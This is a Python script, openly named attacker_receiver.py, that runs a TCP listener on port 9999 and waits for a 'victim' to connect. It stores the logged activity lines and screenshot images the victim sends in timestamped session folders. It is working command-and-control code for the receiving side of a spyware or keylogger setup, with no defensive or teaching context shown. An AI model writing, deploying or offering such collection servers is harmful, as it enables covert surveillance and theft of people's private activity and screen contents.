# attacker_receiver.py
import socket
import os
import sys
import datetime
import threading

def generate_session_folder():
    """Creates a timestamped folder for this session."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    folder_name = f"session_{timestamp}"
    os.makedirs(folder_name, exist_ok=True)
    os.makedirs(os.path.join(folder_name, "screenshots"), exist_ok=True)
    return folder_name

def main():
    # Generate unique session folder
    session_folder = generate_session_folder()
    print(f"[+] Session folder created: {session_folder}")

    # Open log file inside session folder
    log_file_path = os.path.join(session_folder, "full_activity.log")
    log_file = open(log_file_path, "a", encoding="utf-8")
    
    def log_and_print(message):
        """Print to console and write to log file."""
        print(message)
        log_file.write(message + "\n")
        log_file.flush()

    # Setup server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind(("0.0.0.0", 9999))
        s.listen(1)
        log_and_print("[+] Listening for victim on port 9999...")
    except Exception as e:
        log_and_print(f"[-] Failed to bind/listen: {e}")
        log_file.close()
        return

    try:
        conn, addr = s.accept()
        log_and_print(f"[+] Connected by {addr}")
        
        # Set timeout to avoid hanging
        conn.settimeout(5.0)

        buffer = b""
        while True:
            try:
                # Receive data in chunks
                chunk = conn.recv(4096)
                if not chunk:
                    log_and_print("[-] Connection closed by victim.")
                    break

                buffer += chunk

                # Process all complete lines in buffer
                while b"\n" in buffer:
                    line, _, buffer = buffer.partition(b"\n")
                    line = line.strip().decode("utf-8", errors="ignore")

                    if line.startswith("LOG|"):
                        message = line[4:]
                        log_and_print(f"[📝 LOG] {message}")

                    elif line.startswith("IMAGE|"):
                        try:
                            _, filename, size_str = line.split("|", 2)
                            size = int(size_str)
                            log_and_print(f"[📸] Receiving image: {filename} ({size} bytes)")
                            
                            # Receive exactly 'size' bytes
                            image_data = b""
                            remaining = size
                            while remaining > 0:
                                chunk = conn.recv(min(4096, remaining))
                                if not chunk:
                                    raise ConnectionError("Connection closed during transfer")
                                image_data += chunk
                                remaining -= len(chunk)
                                print(f"[📸] Received {len(image_data)}/{size} bytes")
                            
                            # Save image
                            image_path = os.path.join(session_folder, "screenshots", filename)
                            with open(image_path, "wb") as f:
                                f.write(image_data)
                            log_and_print(f"[✅] Image saved: {image_path}")
                            
                        except Exception as e:
                            log_and_print(f"[❌] Error receiving image: {e}")

                    else:
                        log_and_print(f"[📡 UNKNOWN] {line}")

            except socket.timeout:
                # Check if connection is still alive
                try:
                    conn.send(b"")  # This will fail if connection is dead
                except:
                    log_and_print("[-] Connection timed out or lost.")
                    break
                continue  # No data, but connection alive

            except ConnectionResetError:
                log_and_print("[-] Connection reset by victim.")
                break

            except Exception as e:
                log_and_print(f"[💥] Unexpected error: {e}")
                break

    except Exception as e:
        log_and_print(f"[❌] Accept error: {e}")

    finally:
        log_and_print("[🛑] Receiver shutting down.")
        try:
            log_file.close()
            conn.close()
            s.close()
        except:
            pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[🛑] Receiver interrupted by user.")
        sys.exit(0)